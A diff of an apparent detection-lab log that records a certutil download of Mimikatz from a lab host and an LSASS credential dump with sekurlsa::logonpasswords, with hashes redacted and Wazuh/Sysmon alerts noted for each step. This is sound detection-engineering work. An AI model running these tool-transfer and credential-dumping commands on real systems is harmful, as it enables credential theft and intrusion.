@@ -1,23 +1,20 @@
-# Scenario 05 — attacker-side output (credential values redacted)
-# Run 2026-11-01 ~02:34 UTC, INSIDE the RDP Type-10 session (logon 0x34af4d, TerminalSessionId 3)
-# as local admin `Client`. Raw dumped hashes intentionally NOT included; the detection
-# evidence (Wazuh rule 92900 / Sysmon EID 10) is the proof the dump occurred.
-
-# ── Kali: serve the tool ──
-┌──(kali㉿kali)-[~]
-└─$ python3 -m http.server 80
+# Scenario 05 — attacker-side output (credential values REDACTED)
+# Run 2026-11-01 ~02:34 UTC, INSIDE the RDP Type-10 session (logon 0x34af4d, Session 3) as
+# local admin `Client`. Raw NTLM/SHA1/DPAPI hashes are deliberately omitted; the detection
+# evidence (Wazuh 92900 / Sysmon EID 10) is the proof the dump occurred.
 
 # ── T1105 — Ingress Tool Transfer: pull Mimikatz via certutil (LOLBin), renamed to m.exe ──
 PS C:\Windows\system32> certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
 ****  Online  ****
   000000  ...
+  14ae00
 CertUtil: -URLCache command completed successfully.
-#   -> Wazuh 92075 (Sysmon EID 1, certutil, logon 0x34af4d, 02:34:18.980Z, parent powershell.exe)
+#   -> Wazuh 92075 (Sysmon EID 1, certutil, logon 0x34af4d, parent powershell.exe)
 
 # ── T1003.001 — OS Credential Dumping: LSASS Memory ──
 PS C:\Windows\system32> C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
-  .#####.   mimikatz 2.2.0 (x64) #19041
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
@@ -26,14 +23,28 @@ Privilege '20' OK
 
 mimikatz(commandline) # sekurlsa::logonpasswords
 
-[REDACTED] Mimikatz read LSASS and returned credential material (NTLM / SHA1 hashes)
-for the signed-in accounts, including the local administrator `Client`. The raw hashes
-are deliberately omitted from this public repo. What matters for detection: reading
-LSASS memory is exactly what rule 92900 caught — Sysmon Event ID 10,
-`grantedAccess 0x1010`, source `C:\Users\Public\m.exe` -> target `lsass.exe`
-(02:34:24.322Z) — with the name-based match rule 100002 firing on the same run
-(02:34:23.844Z, m.exe OriginalFileName=mimikatz.exe). See the scenario writeup and
-`alert-92900-lsass.json`.
+# The dump enumerated every logon session. The two that matter are the RDP foothold's
+# linked tokens (both "RemoteInteractive from 3") — this is the session the dump ran in:
+
+Authentication Id : 0 ; 3452787 (00000000:0034af73)
+Session           : RemoteInteractive from 3
+User Name         : Client
+Domain            : DESKTOP-T0LOHB5
+  msv:      * NTLM : <REDACTED>   * SHA1 : <REDACTED>   * DPAPI : <REDACTED>
+  wdigest:  * Password : (null)          kerberos: * Password : (null)
+
+Authentication Id : 0 ; 3452749 (00000000:0034af4d)
+Session           : RemoteInteractive from 3
+User Name         : Client
+Domain            : DESKTOP-T0LOHB5
+  msv:      * NTLM : <REDACTED>   * SHA1 : <REDACTED>   * DPAPI : <REDACTED>
+  wdigest:  * Password : (null)          kerberos: * Password : (null)
+
+# (Also present: the older RDP session 0x174a28 / 0x174a7c "RemoteInteractive from 2", plus
+#  local service / DWM / UMFD sessions — all hashes redacted. Note wdigest cleartext = (null):
+#  modern Windows did not cache a plaintext password in memory.)
 
 mimikatz(commandline) # exit
 Bye!
+#   -> Wazuh 92900 (Sysmon EID 10, grantedAccess 0x1010, C:\Users\Public\m.exe -> lsass.exe)
+#      + name-based match Wazuh 100002 (m.exe OriginalFileName=mimikatz.exe). See alert-92900-lsass.json.
